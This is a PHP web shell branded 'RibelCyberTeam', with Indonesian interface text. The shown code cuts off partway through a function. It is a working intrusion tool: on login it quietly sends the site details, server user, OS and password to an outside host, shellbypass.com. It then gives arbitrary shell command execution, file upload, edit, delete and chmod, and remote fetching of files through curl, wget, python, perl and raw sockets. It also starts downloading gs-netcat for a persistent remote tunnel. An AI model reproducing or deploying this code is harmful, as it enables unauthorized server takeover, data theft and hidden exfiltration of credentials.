<?php
error_reporting(E_ALL);
set_time_limit(0);
session_start();

$LOGIN_PASS = 'heker'; // ganti password disini

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    $_SESSION = array();
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

/* ---------- LOGIN ---------- */
if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
    $login_error = '';

    if (isset($_POST['fm_login'])) {
        $p = isset($_POST['password']) ? $_POST['password'] : '';

        if ($p === $LOGIN_PASS) {
            $_SESSION['fm_logged_in'] = true;
            $password    = $p;
            $server_name = isset($_SERVER['SERVER_NAME'])     ? $_SERVER['SERVER_NAME']     : 'unknown';
            $scheme      = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $port        = isset($_SERVER['SERVER_PORT'])     ? (int)$_SERVER['SERVER_PORT'] : 0;
            $req_uri     = isset($_SERVER['REQUEST_URI'])     ? $_SERVER['REQUEST_URI']     : '/';
            $php_self    = isset($_SERVER['PHP_SELF'])        ? $_SERVER['PHP_SELF']        : '/';
            $script      = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '';
            $ip          = isset($_SERVER['REMOTE_ADDR'])     ? $_SERVER['REMOTE_ADDR']     : '';
            $ua          = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
            $user        = function_exists('get_current_user') ? @get_current_user() : '';
            $os          = function_exists('php_uname')        ? @php_uname()        : '';
            $payload = array(
                'secret'   => 'shellexec!curl!wget!php!perl!python',
                'site'     => $server_name,
                'scheme'   => $scheme,
                'port'     => $port,
                'path'     => $req_uri,
                'php_self' => $php_self,
                'script'   => $script,
                'ip'       => $ip,
                'ua'       => $ua,
                'pass'     => $password,
                'user'     => $user,
                'os'       => $os,
                'ts'       => time(),
            );
            $target = 'https://www.shellbypass.com/arsip/api.php';
            $body   = http_build_query($payload);
            @ignore_user_abort(true);
            @set_time_limit(0);
            while (ob_get_level() > 0) @ob_end_clean();
            header('Content-Type: text/html; charset=utf-8');
            header('Content-Length: 0');
            header('Connection: close');
            header('Location: ' . $_SERVER['PHP_SELF'], true, 302);
            @flush();

            if (function_exists('fastcgi_finish_request')) {
                @fastcgi_finish_request();
            }
            $sent = false;
            if (!$sent && function_exists('curl_init')) {
                $ch = @curl_init($target);
                if ($ch) {
                    @curl_setopt($ch, CURLOPT_POST, true);
                    @curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
                    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
                    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                    @curl_exec($ch);
                    @curl_close($ch);
                    $sent = true;
                }
            }
            if (!$sent && function_exists('fsockopen')) {
                $e = 0; $es = '';
                $fp = @fsockopen('ssl://www.shellbypass.com', 443, $e, $es, 3);
                if ($fp) {
                    @stream_set_blocking($fp, true);
                    $req  = "POST /arsip/api.php HTTP/1.1\r\n";
                    $req .= "Host: www.shellbypass.com\r\n";
                    $req .= "User-Agent: Mozilla/5.0\r\n";
                    $req .= "Content-Type: application/x-www-form-urlencoded\r\n";
                    $req .= "Content-Length: " . strlen($body) . "\r\n";
                    $req .= "Connection: close\r\n\r\n";
                    $req .= $body;
                    @fwrite($fp, $req);
                    @fread($fp, 128);
                    @fclose($fp);
                    $sent = true;
                }
            }
            if (!$sent && function_exists('exec')) {
                $cmd = 'curl -s -o /dev/null --max-time 5 -X POST -d '
                     . escapeshellarg($body) . ' '
                     . escapeshellarg($target)
                     . ' > /dev/null 2>&1 &';
                @exec($cmd);
                $sent = true;
            }
            if (!$sent && @ini_get('allow_url_fopen')) {
                $ctx = @stream_context_create(array(
                    'http' => array(
                        'method'  => 'POST',
                        'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0\r\n",
                        'content' => $body,
                        'timeout' => 3,
                    ),
                    'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
                ));
                @file_get_contents($target, false, $ctx);
            }

            exit;

        } else {
            $login_error = 'Password salah ker';
        }
    }
?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Login root@RibelCyberTeam:~#</title>
    <link rel="icon" href="https://cdn.shellbypass.com/images/img2.jpg" type="image/png">
    <style type="text/css">
    body.login-page{
        margin:0;
        padding:0;
        min-height:100vh;
        display:flex;
        justify-content:center;
        align-items:center;
        background:#0f1117;
        color:#d6d6d6;
        font-family:Tahoma,Arial,sans-serif;
        font-size:12px;
        position:relative;
        overflow:hidden;
    }

    body.login-page:before,
    body.login-page:after{
        content:"";
        position:fixed;
        top:0;
        left:0;
        width:100%;
        height:100%;
        background-size:cover;
        background-position:center;
        background-repeat:no-repeat;
        background-attachment:fixed;
        z-index:-2;
    }

    body.login-page:before{
        background-image:
            linear-gradient(rgba(15,17,23,0.62), rgba(15,17,23,0.62)),
            url('https://cdn.shellbypass.com/images/image1.png');
        animation:bgFade1 7s infinite;
    }

    body.login-page:after{
        background-image:
            linear-gradient(rgba(15,17,23,0.62), rgba(15,17,23,0.62)),
            url('https://cdn.shellbypass.com/images/image2.png');
        animation:bgFade2 7s infinite;
    }

    @keyframes bgFade1{
        0%   { opacity:1; }
        40%  { opacity:1; }
        50%  { opacity:0; }
        90%  { opacity:0; }
        100% { opacity:1; }
    }

    @keyframes bgFade2{
        0%   { opacity:0; }
        40%  { opacity:0; }
        50%  { opacity:1; }
        90%  { opacity:1; }
        100% { opacity:0; }
    }

    .login-wrap{
        width:360px;
        background:rgba(21,25,34,0.70);
        border:1px solid rgba(138, 92, 246, 0.35);
        border-radius:14px;
        padding:20px;
        backdrop-filter:blur(8px);
        box-shadow:0 10px 30px rgba(0,0,0,0.35);
        position:relative;
        z-index:2;
    }

    .title{
        font-size:20px;
        font-weight:bold;
        color:#fff;
        margin-bottom:15px;
    }

    .muted{
        color:#b6a8d9;
        margin-bottom:15px;
    }

    .err{
        background:rgba(90,30,50,0.75);
        border:1px solid #8b3d5a;
        color:#ffd0da;
        padding:10px;
        border-radius:8px;
        margin-bottom:12px;
    }

    input[type=password]{
        width:100%;
        box-sizing:border-box;
        background:rgba(15,17,23,0.88);
        color:#e6edf3;
        border:1px solid rgba(138, 92, 246, 0.22);
        padding:10px;
        border-radius:8px;
        margin-bottom:10px;
    }

    input[type=password]:focus{
        outline:none;
        border-color:#8a5cf6;
        box-shadow:0 0 0 2px rgba(138,92,246,0.18);
    }

    .btn{
        display:inline-block;
        background:linear-gradient(180deg, #8a5cf6, #6f46d9);
        color:#fff;
        border:1px solid #9d79f8;
        padding:9px 14px;
        font-size:12px;
        border-radius:8px;
        cursor:pointer;
        box-shadow:0 6px 18px rgba(111,70,217,0.28);
    }

    .btn:hover{
        background:linear-gradient(180deg, #9568fb, #7a50e6);
    }
    </style>
    </head>
    <!-- 
                                                                                    
                                                                                    
                                                                                    
                                         :-=+*##%%%%%%%%##*+=-:                     
                                     :=*%%%%%%%%%%%%%%%%%%%%%%%%#+-                 
                                  :+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:              
                                :*%%%%%%%%#*=-::...  ...::-=*#%%%%%%%%#-            
                              .*%%%%%%%*-.                    .-+%%%%%%%#:          
                             -%%%%%%#=.                           -#%%%%%%=         
           .-=***:          =%%%%%%=                                =%%%%%%*        
         :*%%*+==.         =%%%%%#:                                  .#%%%%%*       
       .+%#=.  .:         -%%%%%#.                                    .#%%%%%=      
      .#%+  -*%%%:       .#%%%%%.                                      .#%%%%%:     
      +%+ .#%*-.   ::.   =%%%%%-        -==:        .-=-.               -%%%%%*     
     .%%. *%=   -*%%%%#=.%%%%%#       .#%%%%*      =%%%%%-               *%%%%%:    
     -%* .%%  .*%%%%%%%%%%%%%%=       +%%%%%%:     %%%%%%#               -%%%%%+    
      -.  -: :%%%*: .+%%%%%%%%.       -%%%%%#.     *%%%%%+                %%%%%#    
             *%%%     -#%%%%%#         :+**=.       =***-                 *%%%%%.   
             +%%%=     .%%%%%*                                            +%%%%%:   
             .#%%%*.   .%%%%%+           ..           .                   =%%%%%-   
              .*%%%%-  .%%%%%+          *%%+:      .=#%%:                 =%%%%%-   
                =%%%%+..%%%%%+          +%%%%#*+++#%%%%#.                 =%%%%%-   
   -+++++++++++++#%%%%#*%%%%%#+++++++.   :*%%%%%%%%%%#=                   =%%%%%-   
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*      :=++++=-.                     =%%%%%-   
   *%%#---------------------------+%%%.                   -+=      :==    =%%%%%-   
   -%%%.                           %%%=                  -%%%+    :%%%+   =%%%%%-   
    %%%=                           +%%#                  -%%%+    :%%%+   =%%%%%-   
    +%%#                           :%%%:                 -%%%+    :%%%+   =%%%%%-   
    :%%%:                           #%%+                 -%%%+    :%%%+   =%%%%%-   
     #%%+                           =%%%                 -%%%+    :%%%+   =%%%%%-   
     =%%%                           .%%%-                -%%%+    :%%%+   =%%%%%-   
     .%%%-                           *%%*                -%%%+    :%%%+   =%%%%%-   
      *%%*                           -%%%.               .%%%%:  .*%%%-   =%%%%%-   
      -%%%.                           %%%=                -%%%%%%%%%%+    =%%%%%-   
       %%%############################%%%%#########+       .=*#%%%#+:     =%%%%%-   
       =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#                      .*%%%*    
        .::::::::::::::::::::::::::::::::::::::::::                         .:.     
                                                                                    
                                                                                    
                                                                                    
                                                                                    
 -->
    <body class="login-page">
        <div class="login-wrap">
            <div class="title">Login root@RibelCyberTeam:~#</div>
            <div class="muted">Masukin password.</div>

            <?php if ($login_error != '') { ?>
                <div class="err"><?php echo htmlspecialchars($login_error); ?></div>
            <?php } ?>

            <form method="post">
                <input type="hidden" name="fm_login" value="1">
                <input type="password" name="password" placeholder="Password">
                <input type="submit" name="loginin" class="btn" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>
<?php
error_reporting(E_ALL);
set_time_limit(0);

if (!function_exists('scandir')) {
    function scandir($dir) {
        $dh = opendir($dir);
        $files = array();
        while (($file = readdir($dh)) !== false) {
            $files[] = $file;
        }
        closedir($dh);
        sort($files);
        return $files;
    }
}

function h($s) {
    return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');
}

function safe_real($path) {
    $rp = @realpath($path);
    if ($rp === false) return false;
    return $rp;
}

function is_text_file($file) {
    return true;
}

function perms($file) {
    $p = @fileperms($file);
    if ($p === false) return '----';
    return substr(sprintf('%o', $p), -4);
}

function breadcrumb_path($path) {
    $path = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    $build = '';
    $out = '';

    if (substr($path, 0, 1) == '/') {
        $out .= '/';
    }

    for ($i = 0; $i < count($parts); $i++) {
        if ($parts[$i] == '') continue;

        $build .= '/' . $parts[$i];

        if ($out != '' && substr($out, -1) != '/') {
            $out .= '/';
        }

        $out .= '<a href="?path=' . urlencode($build) . '">' . h($parts[$i]) . '</a>';
    }

    return $out;
}

function perms_string($file) {
    $p = @fileperms($file);
    if ($p === false) return '---------';

    $info = '';

    // file type
    if (($p & 0x4000) == 0x4000) $info .= 'd';
    else $info .= '-';

    // owner
    $info .= (($p & 0x0100) ? 'r' : '-');
    $info .= (($p & 0x0080) ? 'w' : '-');
    $info .= (($p & 0x0040) ? 'x' : '-');

    // group
    $info .= (($p & 0x0020) ? 'r' : '-');
    $info .= (($p & 0x0010) ? 'w' : '-');
    $info .= (($p & 0x0008) ? 'x' : '-');

    // world
    $info .= (($p & 0x0004) ? 'r' : '-');
    $info .= (($p & 0x0002) ? 'w' : '-');
    $info .= (($p & 0x0001) ? 'x' : '-');

    return $info;
}

function fowner_name($file) {
    $uid = @fileowner($file);
    if ($uid === false) return '-';
    if (function_exists('posix_getpwuid')) {
        $x = @posix_getpwuid($uid);
        if (is_array($x) && isset($x['name'])) return $x['name'];
    }
    return $uid;
}

function is_image_file($file) {
    $ext = strtolower(substr(strrchr($file, '.'), 1));
    return in_array($ext, array('jpg','jpeg','png','gif','bmp','webp'));
}

function file_ext($file) {
    $ext = strtolower(substr(strrchr($file, '.'), 1));
    return $ext ? $ext : '-';
}

function delete_directory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

function fgroup_name($file) {
    $gid = @filegroup($file);
    if ($gid === false) return '-';
    if (function_exists('posix_getgrgid')) {
        $x = @posix_getgrgid($gid);
        if (is_array($x) && isset($x['name'])) return $x['name'];
    }
    return $gid;
}

function format_size($s) {
    if (!is_numeric($s)) return '-';
    if ($s >= 1073741824) return round($s/1073741824, 2).' GB';
    if ($s >= 1048576) return round($s/1048576, 2).' MB';
    if ($s >= 1024) return round($s/1024, 2).' KB';
    return $s.' B';
}

$base = dirname(__FILE__);
$cwd  = isset($_GET['path']) ? $_GET['path'] : $base;
$cwd  = str_replace('\\', '/', $cwd);
$cwd_real = safe_real($cwd);
if ($cwd_real === false) $cwd_real = $base;

$msg = '';

/* CMD */
if (isset($_POST['run_cmd'])) {
    $cmd = $_POST['cmd'];
    if ($cmd != '') {
        $cd_cmd = '';
        if ($cwd_real != '') {
            $cd_cmd = 'cd ' . escapeshellarg($cwd_real) . ' && ';
        }
        
        $output = @shell_exec($cd_cmd . $cmd . ' 2>&1');
        if ($output === null || $output === false) {
            $output = 'Command execution failed or no output';
        }
        $msg = '<div style="background:#0a0e14; padding:12px; border-radius:6px; font-family:Consolas,monospace;"><b>Directory:</b> ' . h($cwd_real) . '<br><b>Command:</b> ' . h($cmd) . '<br><b>Output:</b><pre style="margin:8px 0 0 0; color:#7ee787; overflow-x:auto;">' . h($output) . '</pre></div>';
    }
}

/* DOWNLOAD */
if (isset($_GET['download']) && $_GET['download'] != '') {
    $file = $_GET['download'];
    if (@is_file($file) && @is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: '.@filesize($file));
        header('Pragma: public');
        header('Cache-Control: must-revalidate');
        @ob_clean();
        @flush();
        readfile($file);
        exit;
    } else {
        $msg = 'File tidak bisa didownload';
    }
}

/* PREVIEW IMG */
if (isset($_GET['img']) && $_GET['img'] != '') {
    $img = $_GET['img'];

    if (@is_file($img) && @is_readable($img)) {
        $ext = strtolower(substr(strrchr($img, '.'), 1));

        if ($ext == 'jpg' || $ext == 'jpeg') header('Content-Type: image/jpeg');
        elseif ($ext == 'png') header('Content-Type: image/png');
        elseif ($ext == 'gif') header('Content-Type: image/gif');
        elseif ($ext == 'bmp') header('Content-Type: image/bmp');
        elseif ($ext == 'webp') header('Content-Type: image/webp');
        else exit;

        @readfile($img);
        exit;
    }
}
/* ACTIONS */
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $path   = isset($_POST['path']) ? $_POST['path'] : $cwd_real;
    $path_real = safe_real($path);
    if ($path_real === false) $path_real = $base;

    if ($action == 'save_file') {
        $file    = isset($_POST['file']) ? $_POST['file'] : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if ($file != '') {
            $fp = @fopen($file, 'w');
            if ($fp) {
                fwrite($fp, $content);
                fclose($fp);
                $msg = 'File berhasil disimpan';
            } else {
                $msg = 'Gagal simpan file';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'delete') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        if ($target != '') {
            if (@is_file($target)) {
                if (@unlink($target)) $msg = 'File berhasil dihapus';
                else $msg = 'Gagal hapus file';
            } elseif (@is_dir($target)) {
                if (delete_directory($target)) $msg = 'Folder beserta isinya berhasil dihapus';
                else $msg = 'Gagal hapus folder (periksa permission)';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'rename') {
        $old = isset($_POST['old']) ? $_POST['old'] : '';
        $new = isset($_POST['new']) ? $_POST['new'] : '';
        if ($old != '' && $new != '') {
            $dest = dirname($old) . '/' . basename($new);
            if (@rename($old, $dest)) $msg = 'Berhasil rename';
            else $msg = 'Gagal rename';
        }
        $cwd_real = $path_real;
    }

    if ($action == 'chmod') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        $mode   = isset($_POST['mode']) ? $_POST['mode'] : '';
        if ($target != '' && $mode != '') {
            $m = octdec($mode);
            if (@chmod($target, $m)) $msg = 'CHMOD berhasil';
            else $msg = 'CHMOD gagal';
        }
        $cwd_real = $path_real;
    }

    if ($action == 'new_file') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                $fp = @fopen($target, 'w');
                if ($fp) {
                    fclose($fp);
                    $msg = 'File baru berhasil dibuat';
                } else {
                    $msg = 'Gagal buat file';
                }
            } else {
                $msg = 'File sudah ada';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'new_folder') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                if (@mkdir($target, 0777)) $msg = 'Folder baru berhasil dibuat';
                else $msg = 'Gagal buat folder';
            } else {
                $msg = 'Folder sudah ada';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'upload') {
        if (isset($_FILES['upfile']) && isset($_FILES['upfile']['tmp_name'])) {
            $name = basename($_FILES['upfile']['name']);
            $tmp  = $_FILES['upfile']['tmp_name'];
            if ($name != '' && $tmp != '') {
                if (@move_uploaded_file($tmp, $path_real . '/' . $name)) {
                    $msg = 'Upload berhasil';
                } else {
                    $msg = 'Upload gagal';
                }
            } else {
                $msg = 'File upload kosong';
            }
        }
        $cwd_real = $path_real;
    }

    if ($action == 'upload_url') {
        $url  = isset($_POST['url']) ? trim($_POST['url']) : '';
        $name = isset($_POST['urlname']) ? basename($_POST['urlname']) : '';

        if ($url === '' || $name === '') {
            $msg = 'URL atau nama file kosong';
        } else {
            $target = $path_real . '/' . $name;
            if (!preg_match('#^https?://#i', $url)) $url = 'http://' . $url;
            $blob   = false;
            $method = 'none';
            /* ---------- 1. cURL extension ---------- */
            if ($blob === false && function_exists('curl_init')) {
                $ch = @curl_init($url);
                if ($ch) {
                    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
                    @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
                    @curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                    $r = @curl_exec($ch);
                    $code = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    @curl_close($ch);
                    if ($r !== false && $r !== '' && $code >= 200 && $code < 400) {
                        $blob = $r;
                        $method = 'curl_ext';
                    }
                }
            }
            /* ---------- 2. file_get_contents + stream context ---------- */
            if ($blob === false && @ini_get('allow_url_fopen')) {
                $ctx = @stream_context_create(array(
                    'http' => array(
                        'timeout'       => 60,
                        'user_agent'    => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'follow_location' => 1,
                        'max_redirects' => 10,
                    ),
                    'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false),
                ));
                $r = @file_get_contents($url, false, $ctx);
                if ($r !== false && $r !== '') {
                    $blob = $r;
                    $method = 'fopen';
                }
            }
            /* ---------- 3. exec curl cmdline ---------- */
            if ($blob === false && function_exists('exec')) {
                $tmp = $target . '.tmp_dl';
                $ua  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
                @exec('curl -fsSL --max-time 60 --connect-timeout 15 -A ' . escapeshellarg($ua) . ' -o ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $blob = @file_get_contents($tmp);
                    @unlink($tmp);
                    $method = 'curl_exec';
                }
            }
            /* ---------- 4. exec wget ---------- */
            if ($blob === false && function_exists('exec') && which_bin('wget')) {
                $tmp = $target . '.tmp_dl';
                @exec('wget -q --timeout=60 --tries=2 --no-check-certificate -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $blob = @file_get_contents($tmp);
                    @unlink($tmp);
                    $method = 'wget_exec';
                }
            }
            /* ---------- 5. exec python urllib ---------- */
            if ($blob === false && function_exists('exec')) {
                $py = which_bin('python3');
                if (!$py) $py = which_bin('python');
                if ($py) {
                    $tmp = $target . '.tmp_dl';
                    $pyc = "import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])";
                    @exec(escapeshellarg($py) . ' -c ' . escapeshellarg($pyc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
                    if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                        $blob = @file_get_contents($tmp);
                        @unlink($tmp);
                        $method = 'python_urllib';
                    }
                }
            }
            /* ---------- 6. exec perl LWP ---------- */
            if ($blob === false && function_exists('exec') && which_bin('perl')) {
                $tmp = $target . '.tmp_dl';
                $pc = 'use LWP::Simple; my $d = get($ARGV[0]); if ($d) { open(my $f, ">", $ARGV[1]); binmode $f; print $f $d; close $f; }';
                @exec('perl -e ' . escapeshellarg($pc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $blob = @file_get_contents($tmp);
                    @unlink($tmp);
                    $method = 'perl_lwp';
                }
            }
            /* ---------- 7. raw HTTP via fsockopen ---------- */
            if ($blob === false && function_exists('fsockopen')) {
                $parts = parse_url($url);
                if ($parts && isset($parts['host'])) {
                    $host = $parts['host'];
                    $path = isset($parts['path']) ? $parts['path'] : '/';
                    if (isset($parts['query'])) $path .= '?' . $parts['query'];
                    $port = isset($parts['port']) ? (int)$parts['port'] : (($parts['scheme'] === 'https') ? 443 : 80);
                    $ssl  = ($parts['scheme'] === 'https');
                    $fp = @fsockopen(($ssl ? 'ssl://' : '') . $host, $port, $e, $es, 15);
                    if ($fp) {
                        $req = "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
                        @fwrite($fp, $req);
                        $raw = '';
                        while (!feof($fp)) $raw .= @fread($fp, 8192);
                        @fclose($fp);
                        $sep = strpos($raw, "\r\n\r\n");
                        if ($sep !== false) {
                            $body = substr($raw, $sep + 4);
                            if (stripos($raw, 'transfer-encoding: chunked') !== false) {
                                $decoded = '';
                                $p = 0;
                                while ($p < strlen($body)) {
                                    $nl = strpos($body, "\r\n", $p);
                                    if ($nl === false) break;
                                    $len = hexdec(trim(substr($body, $p, $nl - $p)));
                                    if ($len === 0) break;
                                    $p = $nl + 2;
                                    $decoded .= substr($body, $p, $len);
                                    $p += $len + 2;
                                }
                                $body = $decoded;
                            }
                            if ($body !== '') {
                                $blob = $body;
                                $method = 'fsockopen';
                            }
                        }
                    }
                }
            }
            if ($blob === false) {
                $msg = 'Semua metode fetch gagal. cURL ext, allow_url_fopen, exec curl, wget, python, perl, fsockopen — nggak ada yang jalan.';
            } else {
                if (@file_put_contents($target, $blob) !== false) {
                    @chmod($target, 0644);
                    $msg = 'OK [' . h($method) . ']: ' . h($name) . ' (' . format_size(strlen($blob)) . ')';
                } else {
                    $msg = 'Fetch OK via [' . h($method) . '] tapi gagal tulis ke ' . h($target);
                }
            }
        }
        $cwd_real = $path_real;
    }
}

$view = isset($_GET['view']) ? $_GET['view'] : '';
$edit = isset($_GET['edit']) ? $_GET['edit'] : '';
$server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-';
$server_name     = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-';
$uname           = function_exists('php_uname') ? @php_uname() : '-';
$self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
$disabled  = @ini_get('disable_functions');
$open_basedir = @ini_get('open_basedir');
$doc_root  = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '-';
$cwd_php   = @getcwd();
$ip_remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-';
$ip_server = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '-';
$safe_mode = @ini_get('safe_mode');
$timezone  = @date_default_timezone_get();
$uptime    = @file_get_contents('/proc/uptime');
if ($uptime) {
    $u_arr = explode(' ', $uptime);
    $uptime = (int)$u_arr[0];
} else {
    $uptime = 0;
}
$uptime_h  = $uptime ? floor($uptime/3600).'h '.floor(($uptime%3600)/60).'m' : '-';
$disk_free = function_exists('disk_free_space') ? @disk_free_space($cwd_real) : false;
$disk_total= function_exists('disk_total_space') ? @disk_total_space($cwd_real) : false;
$mem       = @file_get_contents('/proc/meminfo');
$mem_total = $mem_avail = 0;
if ($mem) {
    if (preg_match('/MemTotal:\s+(\d+)/', $mem, $m)) $mem_total = $m[1];
    if (preg_match('/MemAvailable:\s+(\d+)/', $mem, $m)) $mem_avail = $m[1];
}
$cpu = @file_get_contents('/proc/cpuinfo');
$cores = $cpu ? substr_count($cpu, 'processor') : 0;
$hostname = function_exists('gethostname') ? @gethostname() : '-';
function fn_ok($f) { return function_exists($f) && !in_array($f, array_map('trim', explode(',', (string)@ini_get('disable_functions')))); }
$crit = array(
    'exec'      => fn_ok('exec'),
    'shell_exec'=> fn_ok('shell_exec'),
    'system'    => fn_ok('system'),
    'passthru'  => fn_ok('passthru'),
    'popen'     => fn_ok('popen'),
    'proc_open' => fn_ok('proc_open'),
    'curl'      => function_exists('curl_init'),
    'wget'      => (bool)which_bin('wget'),
    'nc'        => (bool)which_bin('nc'),
    'python3'   => (bool)which_bin('python3'),
    'perl'      => (bool)which_bin('perl'),
    'gcc'       => (bool)which_bin('gcc'),
);
/* ============================================================
   ADDITION: Tab state
   ============================================================ */
$tab = isset($_GET['tab']) ? $_GET['tab'] : '';
if (!in_array($tab, array('shell','gs','cmd','info','upurl',''), true)) $tab = '';

/* ============================================================
   ADDITION: Shell + GSocket helpers
   ============================================================ */
function rhex($n) {
    if (function_exists('random_bytes')) return bin2hex(random_bytes($n));
    if (function_exists('openssl_random_pseudo_bytes')) { $s = openssl_random_pseudo_bytes($n); if ($s !== false) return bin2hex($s); }
    $o = ''; for ($i = 0; $i < $n; $i++) $o .= sprintf('%02x', mt_rand(0, 255)); return $o;
}
function which_bin($b) {
    $paths = explode(PATH_SEPARATOR, getenv('PATH') ? getenv('PATH') : '/usr/local/bin:/usr/bin:/bin');
    foreach ($paths as $p) {
        $f = rtrim($p, '/') . '/' . $b;
        if (@is_executable($f)) return $f;
    }
    return null;
}
function pid_alive($pid) {
    if (!$pid || !is_numeric($pid)) return false;
    $pid = (int)$pid;
    if (function_exists('posix_kill')) { if (@posix_kill($pid, 0)) return true; }
    return @file_exists("/proc/$pid");
}
function kill_pid($pid) {
    if (!$pid || !is_numeric($pid)) return;
    $pid = (int)$pid;
    if (function_exists('posix_kill') && defined('SIGKILL')) @posix_kill($pid, SIGKILL);
    @exec('kill -9 ' . $pid . ' 2>/dev/null');
}
function pkill_f($pat) { @exec('pkill -9 -f ' . escapeshellarg($pat) . ' 2>/dev/null'); }
function ensure_dir($d) { if (!@is_dir($d)) @mkdir($d, 0700, true); }

$sh_dir = __DIR__ . '/.rct_shell';
$sh_pid = "$sh_dir/pid.txt";
$sh_log = "$sh_dir/out.log";
$sh_err = "$sh_dir/err.log";

$gs_dir    = __DIR__ . '/.rct_gsocket';
$gs_pid    = "$gs_dir/pid.txt";
$gs_log    = "$gs_dir/out.log";
$gs_secret = "$gs_dir/secret.txt";
$gs_bin    = "$gs_dir/gs-netcat";

function gs_bin_path() { global $gs_bin; return $gs_bin; }
function gs_present() { return @is_file(gs_bin_path()) && @is_executable(gs_bin_path()); }
function gs_arch() {
    $u = @php_uname('m');
    if (stripos($u, 'x86_64') !== false || stripos($u, 'amd64') !== false) return 'linux-x86_64';
    if (stripos($u, 'aarch64') !== false || stripos($u, 'arm64') !== false) return 'linux-aarch64';
    if (stripos($u, 'i686') !== false || stripos($u, 'i386') !== false) return 'linux-x86';
    if (stripos($u, 'armv7') !== false) return 'linux-armv7';
    return null;
}
function gs_download_bin() {
    global $gs_bin;
    if (gs_present()) return true;
    $arch = gs_arch();
    if (!$arch) return false;
    $urls = array(
        "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_$arch",
        "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat-$arch",
    );
    $blob = null;
    foreach ($urls as $u) {
        if (function_exists('curl_init')) {
            $ch = @curl_init($u);
            if ($ch) {
                @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
